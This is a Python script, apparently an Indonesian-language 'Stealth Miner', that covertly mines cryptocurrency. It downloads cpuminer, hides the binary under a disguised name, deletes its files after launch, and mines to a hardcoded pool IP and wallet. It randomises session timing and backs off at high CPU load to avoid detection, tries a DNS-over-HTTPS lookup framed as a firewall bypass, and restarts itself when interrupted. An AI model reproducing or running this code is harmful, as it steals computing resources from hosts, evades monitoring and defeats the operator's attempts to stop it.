#!/usr/bin/env python3

import os
import subprocess
import urllib.request
import tarfile
import time
import threading
import shutil
import sys
import random

# ==== KONFIGURASI ====
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".python3_hidden"
POOL = "stratum+tcp://134.199.163.180:6343"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()
MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180  # Cooldown 3 menit

# ==== ANTI SUSPEND TANPA ROOT ====
def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

# ==== BYPASS DNS FIREWALL ====
def dns_doh_bypass():
    try:
        subprocess.call([
            "curl", "-s", "-H", "accept: application/dns-json",
            "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# ==== CEK PENGGUNAAN CPU SECARA REAL-TIME ====
def is_cpu_100_percent():
    try:
        load = os.getloadavg()[0]
        cores = os.cpu_count()
        return load >= cores
    except:
        return False

# ==== 1 SESI MINING ====
def run_one_session():
    print("[*] Mengunduh miner...")
    urllib.request.urlretrieve(URL, TARFILE)

    print("[*] Mengekstrak...")
    with tarfile.open(TARFILE) as tar:
        tar.extractall()

    os.rename(BIN_NAME, ALIAS_BIN)
    os.chmod(ALIAS_BIN, 0o755)

    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[*] Menambang selama maksimal {duration} detik dengan {THREADS} thread...")

    proc = subprocess.Popen([
        f"./{ALIAS_BIN}", "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(10)
    os.remove(ALIAS_BIN)
    os.remove(TARFILE)

    start_time = time.time()
    while time.time() - start_time < duration:
        time.sleep(10)
        if is_cpu_100_percent():
            print(f"[⚠️] CPU 100% terdeteksi! Menjalankan cooldown selama {COOLDOWN_DURATION} detik...")
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
            print("[🛑] Miner dihentikan sementara.")
            time.sleep(COOLDOWN_DURATION)
            return  # Restart dari awal sesi

    print("[✓] Durasi sesi selesai. Menghentikan miner...")
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()

# ==== LOOP UTAMA ====
def main_loop():
    while True:
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[⏳] Menunggu {pause} detik sebelum sesi berikutnya...\n")
        time.sleep(pause)

# ==== AUTO RESTART ====
def restart_script():
    try:
        print("[🔁] Mempersiapkan restart otomatis...")
        time.sleep(5)
        subprocess.Popen([sys.executable] + sys.argv)
        print("[🚀] Script telah di-restart dari subprocess.")
    except Exception as e:
        print(f"[X] Gagal restart otomatis: {e}")

# ==== MAIN ====
if __name__ == "__main__":
    print("⛏️  Stealth Miner: Auto-Restart + Timer Acak + No Root + Cooldown")

    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()

    try:
        main_loop()
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user.")
        restart_script()
    except Exception as e:
        print(f"[!] Error: {e}")
        restart_script()
